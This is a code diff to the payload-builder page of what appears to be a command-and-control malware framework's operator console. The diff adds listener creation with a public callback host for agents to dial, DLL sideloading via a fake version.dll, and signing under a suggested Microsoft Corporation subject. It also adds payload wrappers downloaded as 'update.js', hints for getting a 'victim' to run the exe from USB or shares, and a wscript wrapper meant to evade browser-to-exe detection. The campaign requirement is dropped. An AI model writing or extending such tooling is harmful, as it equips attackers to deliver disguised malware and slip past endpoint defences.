@@ -1,10 +1,12 @@
 import { useState } from 'react'
 import { Link } from 'react-router-dom'
-import { useQuery, useQueryClient } from '@tanstack/react-query'
+import { useQuery, useQueryClient, useMutation } from '@tanstack/react-query'
 import { api } from '../api/client'
 
 interface Campaign { id: string; name: string }
-interface Listener { id: string; name: string; bind_host: string; bind_port: number; type: string }
+interface Listener { id: string; name: string; bind_host: string; bind_port: number; callback_host?: string; type: string }
+
+const LISTENER_INIT = { name: '', bind_host: '0.0.0.0', bind_port: 4443, callback_host: '', type: 'https' }
 interface Build {
   id:            string
   campaign_id?:  string
@@ -50,6 +52,7 @@ const FEATURE_GROUPS: { label: string; features: [string, string][] }[] = [
       ['udrl',           'Reflective loader (UDRL)'],
       ['process-hollow', 'Hollow into trusted process (requires udrl)'],
       ['staged-payload', 'Staged payload (requires udrl)'],
+      ['dll-sideload',   'DLL sideloading — compiles as version.dll for signed-EXE bundle'],
       ['self-delete',    'Agent self-delete on cleanup'],
     ],
   },
@@ -64,6 +67,7 @@ const INITIAL = {
   jitter_pct:      20,
   ephemeral:       true,
   tls_skip_verify: true,
+  sign_subject:    '',
   features:        [] as string[],
 }
 type FormState = typeof INITIAL
@@ -73,7 +77,25 @@ export function BuildPage() {
   const [building, setBuilding]       = useState(false)
   const [lastBuildId, setLastBuildId] = useState('')
   const [error, setError]             = useState('')
+  const [showNewListener, setShowNewListener] = useState(false)
+  const [listenerForm, setListenerForm]       = useState(LISTENER_INIT)
+  const [listenerError, setListenerError]     = useState('')
   const qc = useQueryClient()
+
+  const createListener = useMutation({
+    mutationFn: (data: typeof LISTENER_INIT) => api.post('/api/v1/listeners', data).then(r => r.data),
+    onSuccess: (created: Listener) => {
+      void qc.invalidateQueries({ queryKey: ['listeners'] })
+      setForm(f => ({ ...f, listener_id: created.id }))
+      setShowNewListener(false)
+      setListenerForm(LISTENER_INIT)
+      setListenerError('')
+    },
+    onError: (err: unknown) => {
+      const msg = (err as { response?: { data?: { error?: string } } })?.response?.data?.error
+      setListenerError(msg ?? 'Create listener failed')
+    },
+  })
 
   const { data: campaigns = [] } = useQuery<Campaign[]>({
     queryKey: ['campaigns'],
@@ -98,6 +120,30 @@ export function BuildPage() {
         ? f.features.filter(x => x !== feat)
         : [...f.features, feat],
     }))
+  }
+
+  async function downloadWrap(buildId: string, format: 'hta' | 'ps1' | 'js') {
+    try {
+      const res = await api.get(`/api/v1/builds/${buildId}/deliver?format=${format}`, { responseType: 'blob' })
+      const url = URL.createObjectURL(res.data)
+      const a = document.createElement('a')
+      a.href = url
+      a.download = `update.${format}`
+      a.click()
+      URL.revokeObjectURL(url)
+    } catch (err: unknown) {
+      const data = (err as { response?: { data?: unknown } })?.response?.data
+      if (data instanceof Blob) {
+        try {
+          const json = JSON.parse(await data.text())
+          setError(json.error ?? `Failed to download ${format}`)
+        } catch {
+          setError(`Failed to download ${format}`)
+        }
+      } else {
+        setError((data as { error?: string })?.error ?? `Failed to download ${format}`)
+      }
+    }
   }
 
   async function handleBuild(e: React.FormEvent) {
@@ -183,7 +229,6 @@ export function BuildPage() {
                 <div>
                   <label className="dm-label">Campaign</label>
                   <select
-                    required
                     className="dm-select"
                     value={form.campaign_id}
                     onChange={e => setForm(f => ({ ...f, campaign_id: e.target.value }))}
@@ -193,7 +238,20 @@ export function BuildPage() {
                   </select>
                 </div>
                 <div>
-                  <label className="dm-label">Listener</label>
+                  <div className="flex items-center justify-between mb-1">
+                    <label className="dm-label" style={{ marginBottom: 0 }}>Listener</label>
+                    <button
+                      type="button"
+                      onClick={() => setShowNewListener(true)}
+                      style={{
+                        background: 'none', border: '1px solid var(--dm-border)',
+                        color: 'var(--dm-accent-lo)', fontSize: '0.62rem',
+                        letterSpacing: '0.1em', padding: '1px 6px', cursor: 'pointer',
+                      }}
+                    >
+                      + new
+                    </button>
+                  </div>
                   <select
                     className="dm-select"
                     value={form.listener_id}
@@ -202,7 +260,7 @@ export function BuildPage() {
                     <option value="">Select listener…</option>
                     {listeners.map(l => (
                       <option key={l.id} value={l.id}>
-                        {l.name} — {l.type} {l.bind_host}:{l.bind_port}
+                        {l.name} — {l.type} {l.callback_host || l.bind_host}:{l.bind_port}
                       </option>
                     ))}
                   </select>
@@ -252,6 +310,18 @@ export function BuildPage() {
                     onChange={e => setForm(f => ({ ...f, jitter_pct: +e.target.value }))}
                   />
                 </div>
+              </div>
+              <div className="mb-3">
+                <label className="dm-label">
+                  Sign Subject&nbsp;
+                  <span style={{ color: 'var(--dm-text-lo)', fontWeight: 400 }}>(leave blank = unsigned)</span>
+                </label>
+                <input
+                  className="dm-input"
+                  placeholder="CN=Microsoft Windows,O=Microsoft Corporation,C=US"
+                  value={form.sign_subject}
+                  onChange={e => setForm(f => ({ ...f, sign_subject: e.target.value }))}
+                />
               </div>
               <div className="space-y-2">
                 <label className="flex items-center gap-2.5 cursor-pointer select-none">
@@ -333,7 +403,7 @@ export function BuildPage() {
             <div style={{ padding: '1rem 1.25rem' }}>
               <button
                 type="submit"
-                disabled={building || !form.campaign_id}
+                disabled={building}
                 className="dm-btn"
               >
                 {building ? '// building...' : 'Build Payload'}
@@ -401,14 +471,35 @@ export function BuildPage() {
                     </td>
                     <td style={{ padding: '0.6rem 1rem' }}>
                       {b.status === 'complete' && b.artifact_url && (
-                        <a
-                          href={b.artifact_url}
-                          style={{ color: 'var(--dm-blue)', fontSize: '0.72rem', textDecoration: 'none', transition: 'color 0.1s' }}
-                          onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
-                          onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-blue)')}
-                        >
-                          ↓ download
-                        </a>
+                        <div className="flex flex-col gap-1.5">
+                          <div className="flex items-baseline gap-2">
+                            <a
+                              href={b.artifact_url}
+                              style={{ color: 'var(--dm-blue)', fontSize: '0.72rem', textDecoration: 'none', transition: 'color 0.1s', flexShrink: 0 }}
+                              onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
+                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-blue)')}
+                            >
+                              ↓ exe
+                            </a>
+                            <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
+                              direct payload — use when victim runs it themselves (Explorer, USB, internal share)
+                            </span>
+                          </div>
+                          <div className="flex items-baseline gap-2">
+                            <button
+                              type="button"
+                              onClick={() => downloadWrap(b.id, 'js')}
+                              style={{ background: 'none', border: 'none', padding: 0, cursor: 'pointer', color: 'var(--dm-amber)', fontSize: '0.72rem', transition: 'color 0.1s', flexShrink: 0 }}
+                              onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
+                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-amber)')}
+                            >
+                              ↓ js
+                            </button>
+                            <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
+                              wscript wrapper — use when browser is the delivery vector; breaks Chrome→exe parent chain that triggers ATD
+                            </span>
+                          </div>
+                        </div>
                       )}
                       {b.status === 'failed' && (
                         <span style={{ color: 'var(--dm-red)', fontSize: '0.68rem' }}>failed</span>
@@ -421,6 +512,88 @@ export function BuildPage() {
           )}
         </div>
       </div>
+
+      {/* ── New Listener modal ──────────────────────────────── */}
+      {showNewListener && (
+        <div
+          style={{
+            position: 'fixed', inset: 0, zIndex: 50,
+            background: 'rgba(0,0,0,0.7)',
+            display: 'flex', alignItems: 'center', justifyContent: 'center',
+          }}
+          onClick={e => { if (e.target === e.currentTarget) { setShowNewListener(false); setListenerError('') } }}
+        >
+          <div style={{
+            background: 'var(--dm-surface)', border: '1px solid var(--dm-border)',
+            padding: '1.5rem', width: '100%', maxWidth: '380px',
+          }}>
+            <div style={{ color: 'var(--dm-text-hi)', fontWeight: 700, fontSize: '0.82rem', letterSpacing: '0.12em', marginBottom: '1rem' }}>
+              NEW LISTENER
+            </div>
+            {listenerError && (
+              <div style={{ color: 'var(--dm-red)', fontSize: '0.72rem', marginBottom: '0.75rem' }}>
+                ✕&nbsp;{listenerError}
+              </div>
+            )}
+            <div className="space-y-3">
+              <div>
+                <label className="dm-label">Name</label>
+                <input className="dm-input" value={listenerForm.name}
+                  onChange={e => setListenerForm(f => ({ ...f, name: e.target.value }))} />
+              </div>
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="dm-label">Bind Host</label>
+                  <input className="dm-input" placeholder="0.0.0.0" value={listenerForm.bind_host}
+                    onChange={e => setListenerForm(f => ({ ...f, bind_host: e.target.value }))} />
+                </div>
+                <div>
+                  <label className="dm-label">Port</label>
+                  <input className="dm-input" type="number" min={1} max={65535} value={listenerForm.bind_port}
+                    onChange={e => setListenerForm(f => ({ ...f, bind_port: +e.target.value }))} />
+                </div>
+              </div>
+              <div>
+                <label className="dm-label">Callback Host <span style={{ color: 'var(--dm-text-lo)', fontWeight: 400 }}>(public IP / domain agents dial)</span></label>
+                <input className="dm-input" placeholder="e.g. 1.2.3.4 or c2.example.com"
+                  value={listenerForm.callback_host}
+                  onChange={e => setListenerForm(f => ({ ...f, callback_host: e.target.value }))} />
+              </div>
+              <div>
+                <label className="dm-label">Type</label>
+                <select className="dm-select" value={listenerForm.type}
+                  onChange={e => setListenerForm(f => ({ ...f, type: e.target.value }))}>
+                  <option value="https">HTTPS</option>
+                  <option value="http">HTTP</option>
+                  <option value="tcp">TCP</option>
+                  <option value="smb">SMB</option>
+                </select>
+              </div>
+            </div>
+            <div className="flex gap-3 mt-4">
+              <button
+                type="button"
+                className="dm-btn"
+                disabled={createListener.isPending || !listenerForm.name || !listenerForm.bind_host || !listenerForm.bind_port}
+                onClick={() => createListener.mutate(listenerForm)}
+              >
+                {createListener.isPending ? '// creating...' : 'Create'}
+              </button>
+              <button
+                type="button"
+                onClick={() => { setShowNewListener(false); setListenerError('') }}
+                style={{
+                  background: 'none', border: '1px solid var(--dm-border)',
+                  color: 'var(--dm-text-lo)', fontSize: '0.75rem',
+                  padding: '0.45rem 0.9rem', cursor: 'pointer',
+                }}
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
